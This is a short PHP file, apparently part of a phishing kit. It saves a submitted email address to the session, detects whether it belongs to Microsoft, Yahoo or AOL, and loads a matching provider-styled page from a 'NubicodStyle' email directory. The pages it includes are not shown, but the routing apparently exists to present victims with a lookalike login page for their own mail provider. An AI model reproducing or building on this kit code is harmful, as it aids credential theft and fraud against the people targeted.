<?php
$core->_save_ses('email', trim($_POST['emails']));
$switch = $core->_get_email($core->_get_ses('email'));
switch ($switch) {
  case 'microsoft': require_once(SYSTEM_PATH . '/NubicodStyle/main/email/microsoft.nubicod.php'); break;
  case 'yahoo': require_once(SYSTEM_PATH . '/NubicodStyle/main/email/yahoo.nubicod.php'); break;
  case 'aol': require_once(SYSTEM_PATH . '/NubicodStyle/main/email/aol.nubicod.php'); break;
  default: require_once(SYSTEM_PATH . '/NubicodStyle/main/email/other.nubicod.php'); break;
}
?>
